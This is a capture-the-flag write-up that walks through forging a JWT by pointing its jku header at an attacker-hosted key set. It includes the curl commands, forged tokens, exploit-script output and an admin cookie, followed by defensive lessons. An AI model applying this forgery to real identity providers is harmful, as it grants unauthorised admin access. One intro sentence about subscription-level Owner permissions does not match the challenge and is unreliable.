# Rogue Gnome Identity Provider

**Difficulty**: ⭐⭐⭐⭐⭐

---

Rogue Gnome Identity Provider

*Difficulty: ❄️❄️❄️❄️❄️*

Help Goose Barry near the pond identify which identity has been granted
excessive Owner permissions at the subscription level, violating the
principle of least privilege.

Paul

*Hey, I'm Paul! I've been at Counter Hack since 2024 and loving every
minute of it. I'm a pentester who digs into web, API, and mobile apps,
and I'm also a fan of Linux. When I'm not hacking away, you can catch
me enjoying board games, hiking, or paddle boarding!*

*As a pentester, I proper love a good privilege escalation challenge,
and that's exactly what we've got here.*

*I've got access to a Gnome's Diagnostic Interface at
gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's
just a low-privilege account.*

*The gnomes are getting some dodgy updates, and I need admin access to
see what's actually going on.*

*Ready to help me find a way to bump up our access level, yeah?*

Hi, Paul here. Welcome to my web-server. I've been using it for JWT
analysis. I've discovered the Gnomes have a diagnostic interface that
authenticates to an Atnas identity provider. Unfortunately the
gnome:SittingOnAShelf credentials discovered in 2015 don't have
sufficient access to view the gnome diagnostic interface. I've kept
some notes in \~/notes Can you help me gain access to the Gnome
diagnostic interface and discover the name of the file the Gnome
downloaded? When you identify the filename, enter it in the badge.

Checking Paul's Notes

First thing, let's see what Paul has already figured out:

paul@paulweb:\~\$ cat notes

\# Sites \## Captured Gnome: curl http://gnome-48371.atnascorp/ \##
ATNAS Identity Provider (IdP): curl http://idp.atnascorp/ \## My
CyberChef website: curl http://paulweb.neighborhood/ \### My CyberChef
site html files: \~/www/ \# Credentials \## Gnome credentials (found on
a post-it): Gnome:SittingOnAShelf \# Curl Commands Used in Analysis of
Gnome: \## Gnome Diagnostic Interface authentication required page: curl
http://gnome-48371.atnascorp \## Request IDP Login Page curl
http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth
\## Authenticate to IDP curl -X POST \--data-binary
\$'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth'
http://idp.atnascorp/login \## Pass Auth Token to Gnome curl -v
http://gnome-48371.atnascorp/auth?token=\<insert-JWT\> \## Access Gnome
Diagnostic Interface curl -H 'Cookie: session=\<insert-session\>'
http://gnome-48371.atnascorp/diagnostic-interface \## Analyze the JWT
jwt_tool.py \<insert-JWT\>

Nice! Paul's already mapped out the authentication flow. It's using
JWT tokens - those are always fun to mess with. Let's follow his steps.

Step 1: Authenticate and Get JWT

Let's authenticate with the credentials Paul found and see what we get:

paul@paulweb:\~\$ curl -X POST \--data-binary
'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth'
http://idp.atnascorp/login

\<!doctype html\> \<html lang=en\> \<title\>Redirecting\...\</title\>
\<h1\>Redirecting\...\</h1\> \<p\>You should be redirected automatically
to the target URL: \<a
href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjgxNjc1NSwiZXhwIjoxNzY2ODIzOTU1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.2BEhQtIkX61yS5Q4HzRCIchtmSetbMLyKJVo1Lcnm0wFs1CqaEK-WmI40u_OqkKApL7jRiHRoeiBmyVpzKVOaaXZXvk_PZY4DT6FTHcopYJ0LotVXfd6BHppFxPAbHtuILdQ0PitkdSE2imP2YNGRfnH3v2lOKvS6rtxWk3pCpz-D59rYIIIOIpTtlyzWrhZtqsDK67pym0TAu0mu0CRTlpsTDDe5-p1Fk6uegvQbqIP0TpkuAoQkWBZWTC2WAiGOGB5gJdyNPD9YbB_YtRybq6e-ZvlDPCe2r7dGoJRBCra0S68Q6riZg9_T6O4kaVaEZ7_w7WpfzCZfNS3shfdtw\</a\>.

Perfect! Got a JWT token. That massive string after "token=" is our
JWT. Let's decode it and see what we're working with.

Step 2: Decode the JWT

JWTs are base64 encoded and have three parts: header.payload.signature.
Let's decode them:

TOKEN="eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjgxNjc1NSwiZXhwIjoxNzY2ODIzOTU1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.2BEhQtIkX61yS5Q4HzRCIchtmSetbMLyKJVo1Lcnm0wFs1CqaEK-WmI40u_OqkKApL7jRiHRoeiBmyVpzKVOaaXZXvk_PZY4DT6FTHcopYJ0LotVXfd6BHppFxPAbHtuILdQ0PitkdSE2imP2YNGRfnH3v2lOKvS6rtxWk3pCpz-D59rYIIIOIpTtlyzWrhZtqsDK67pym0TAu0mu0CRTlpsTDDe5-p1Fk6uegvQbqIP0TpkuAoQkWBZWTC2WAiGOGB5gJdyNPD9YbB_YtRybq6e-ZvlDPCe2r7dGoJRBCra0S68Q6riZg9_T6O4kaVaEZ7_w7WpfzCZfNS3shfdtw"
echo "=== JWT HEADER ===" echo \$TOKEN \| cut -d. -f1 \| base64 -d \|
python3 -m json.tool echo "" echo "=== JWT PAYLOAD ===" echo \$TOKEN
\| cut -d. -f2 \| base64 -d \| python3 -m json.tool

=== JWT HEADER === { "alg": "RS256", "jku":
"http://idp.atnascorp/.well-known/jwks.json", "kid":
"idp-key-2025", "typ": "JWT" } === JWT PAYLOAD === { "sub":
"gnome", "iat": 1766816755, "exp": 1766823955, "iss":
"http://idp.atnascorp/", "admin": false }

**🚨 JACKPOT! Found two vulnerabilities:**

-   **"jku" header** - This tells the server WHERE to fetch the keys
    to verify the JWT signature. We can point this to OUR server!

-   **"admin": false** - This controls our privilege level. If we can
    forge a JWT with admin=true, we win!

The attack is clear: generate our own RSA keys, host them on Paul's web
server, create a JWT with admin=true, point the jku to our keys, and the
server will validate our forged token!

The Attack: JWT Forgery via JKU Injection

I created an automated script to do all the heavy lifting. Here's what
it does:

-   Generates RSA key pair (2048-bit)

-   Creates JWKS (JSON Web Key Set) with our public key

-   Hosts it on Paul's web server at \~/www/.well-known/jwks.json

-   Forges a JWT with admin=true and jku pointing to our JWKS

-   Signs it with our private key

-   Sends it to the gnome auth endpoint

-   Gets admin session cookie back!

Let's run it:

paul@paulweb:\~\$ bash jwt_exploit.sh

=== JWT Exploitation Script === Step 1: Analyzing the original JWT\...
Header: { "alg": "RS256", "jku":
"http://idp.atnascorp/.well-known/jwks.json", "kid":
"idp-key-2025", "typ": "JWT" } Payload: { "sub": "gnome",
"iat": 1766816755, "exp": 1766823955, "iss":
"http://idp.atnascorp/", "admin": false } Vulnerability: JKU header
points to external URL + admin=false in payload Step 2: Generating RSA
key pair\... ✓ Keys generated Step 3: Creating JWKS with our public
key\... ✓ JWKS created at /tmp/jwks.json Step 4: Setting up web server
to host JWKS\... ✓ JWKS hosted at \~/www/.well-known/jwks.json
Accessible via: http://paulweb.neighborhood/.well-known/jwks.json Step
5: Creating malicious JWT with admin=true\... ✓ Malicious JWT created:
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjgxNzI0OCwiZXhwIjoxNzY2ODI0NDQ4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.a95sabK659Q1mdSpG64AQZnL7uvlknfKv7BtOTWDBdvS4yCvdt2W3YKcAvdNGX9HHXRB-eWqDTm7HouYHuYKhiGqVygzcan8TVTN7znkF-Ui3R0fWp6Avh77aQ_VkMKoJZVNGqLHUtEU1uydc_tWwzO6YW52IUHzT2aiV6iJS8N0xmNLpQYZdtgcSBheD2153jmFuH6cxzPnu4e8-CosAQewBpdpDYnjZOfKtvpEV2cr2jdRBXVH43dSGwo3j2LBBcZhnbcCih3Tidzjm4U9NMw76mdmRBl8hQ14hKVUW5JLDvF8WEcgyoyso7GB5cwjcJCojC6lN5IpJOXc3epr1g

Beautiful! The script generated everything we need. Now let's use that
malicious JWT to get admin access.

Step 6: Testing the malicious JWT\... Authenticating with malicious
token\... \* Host gnome-48371.atnascorp:80 was resolved. \* IPv6: (none)
\* IPv4: 127.0.0.1 \* Trying 127.0.0.1:80\... \* Connected to
gnome-48371.atnascorp (127.0.0.1) port 80 \> GET
/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjgxNzI0OCwiZXhwIjoxNzY2ODI0NDQ4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0\...
HTTP/1.1 \> Host: gnome-48371.atnascorp \> User-Agent: curl/8.5.0 \>
Accept: \*/\* \> \< HTTP/1.1 302 FOUND \< Date: Sat, 27 Dec 2025
06:34:08 GMT \< Server: Werkzeug/3.0.1 Python/3.12.3 \< Content-Type:
text/html; charset=utf-8 \< Content-Length: 229 \< Location:
/diagnostic-interface \< Vary: Cookie \< Set-Cookie:
session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aU994A.JrxuXqH_R0gVggZY1gUttXhDGPU;
HttpOnly; Path=/ \< ✓ Session cookie obtained:
eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aU994A.JrxuXqH_R0gVggZY1gUttXhDGPU

**🎉 SUCCESS!** Look at that Set-Cookie header - we got an admin
session! The server:

-   Received our forged JWT

-   Read the jku header pointing to Paul's web server

-   Fetched OUR JWKS with OUR public key

-   Validated the signature using OUR key (it matched!)

-   Trusted the admin=true claim

-   Gave us an admin session cookie!

Now let's use that admin session to access the diagnostic interface and
see what the gnomes are up to.

Admin Access: What Did the Gnome Download?

Step 7: Accessing diagnostic interface with admin privileges\...
========================================== \<!DOCTYPE html\> \<html\>
\<head\> \<title\>AtnasCorp : Gnome Diagnostic Interface\</title\>
\<link rel="stylesheet" type="text/css"
href="/static/styles/styles.css"\> \</head\> \<body\> \<h1\>AtnasCorp
: Gnome Diagnostic Interface\</h1\> \<div style='display:flex;
justify-content:center; gap:10px;'\> \<img src='/camera-feed'
style='width:30vh; height:30vh; border:5px solid yellow;
border-radius:15px; flex-shrink:0;' /\> \<div style='width:30vh;
height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;
display:flex; align-items:flex-start; justify-content:flex-start;
text-align:left;'\> System Log\<br/\> 2025-12-27 02:02:57: Movement
detected.\<br/\> 2025-12-27 05:08:30: AtnasCorp C&C connection
restored.\<br/\> 2025-12-27 06:32:58: Checking for updates.\<br/\>
2025-12-27 06:32:58: Firmware Update available:
refrigeration-botnet.bin\<br/\> 2025-12-27 06:33:00: Firmware update
downloaded.\<br/\> 2025-12-27 06:33:00: Gnome will reboot to apply
firmware update in one hour.\</div\> \</div\> \<div
class="statuscheck"\> \<div class="status-container"\> \<div
class="status-item"\> \<div class="status-indicator
active"\>\</div\> \<span\>Live Camera Feed\</span\> \</div\> \<div
class="status-item"\> \<div class="status-indicator
active"\>\</div\> \<span\>Network Connection\</span\> \</div\> \<div
class="status-item"\> \<div class="status-indicator
active"\>\</div\> \<span\>Connectivity to Atnas C&C\</span\> \</div\>
\</div\> \</div\> \</body\> \</html\>
==========================================

**🚨 HOLY SMOKES! 🚨**

Look at that system log - the gnomes aren't getting legitimate updates
at all! They're being turned into a BOTNET!

**Key findings:**

-   **AtnasCorp C&C connection** - Command & Control server (and Atnas =
    Santa backwards 👀)

-   **Firmware Update: refrigeration-botnet.bin** - THE ANSWER!

-   Targeting refrigeration systems - probably IoT devices

-   Auto-install in one hour - no user interaction needed

**Answer: refrigeration-botnet.bin**

How the Attack Works

What is a JKU Header?

The 'jku' (JWK Set URL) header in a JWT tells the server where to
fetch the public keys used to verify the token's signature. It's like
asking the server "hey, go grab the keys from this URL to check if I'm
legit."

The problem? If the server blindly trusts ANY URL in the jku header, an
attacker can:

-   Host their own public keys

-   Point jku to their server

-   Forge any JWT they want (with admin=true, for example)

-   Sign it with their own private key

-   Server validates signature using attacker's public key

-   Signature checks out = access granted!

It's basically asking the criminal "can you provide your own ID
checker?" instead of using a trusted authority.

The Attack Flow

1\. Attacker generates RSA key pair └─\> public.pem + private.pem 2.
Attacker creates JWKS with public key └─\> jwks.json with RSA modulus &
exponent 3. Attacker hosts JWKS on accessible server └─\>
http://paulweb.neighborhood/.well-known/jwks.json 4. Attacker forges
JWT: Header: {"jku":
"http://paulweb.neighborhood/.well-known/jwks.json"} Payload:
{"admin": true} └─\> Signs with private.pem 5. Server receives forged
JWT ├─\> Reads jku header ├─\> Fetches JWKS from attacker's server ├─\>
Uses attacker's public key to verify └─\> Signature valid! Admin access
granted!

Why This Works

The JWT is cryptographically valid - the signature DOES match the
payload. The problem is it's not AUTHENTIC - it wasn't signed by the
legitimate identity provider.

The server is checking "does this signature match this payload?" (YES)
instead of "was this signed by someone I trust?" (NO).

It's like writing yourself a permission slip and also providing the
signature verification service - of course it checks out!

What We Learned

Key Concepts

-   **JWT Structure:** header.payload.signature (all base64url encoded)

-   **JKU Header:** Dangerous parameter that tells server where to fetch
    verification keys

-   **JWKS:** JSON Web Key Set - contains public keys in JSON format

-   **RS256:** RSA signature algorithm with SHA-256

-   **Authentication vs Authorization:** JWT handled both (who you are +
    what you can do)

Security Lessons

-   **Never trust client-controlled input for security decisions**

-   JKU headers should be disabled or strictly whitelisted

-   Use hardcoded public keys or kid (key ID) with local lookup instead

-   Always validate the JWT issuer (iss claim)

-   Implement defense in depth - don't rely on JWT alone

Real-World Parallels

This isn't just a CTF trick - real systems have been vulnerable:

-   **CVE-2018-0114:** Cisco Node.js JWT implementation

-   **CVE-2020-26875:** OpenVPN3 Linux Client

-   Multiple bug bounty payouts for JKU/x5u vulnerabilities

**Challenge Status: ✅ Completed**

*Thanks for reading!*

*- SFC David P. Collette*

*Regional Cyber Center - Korea (RCC-K)*
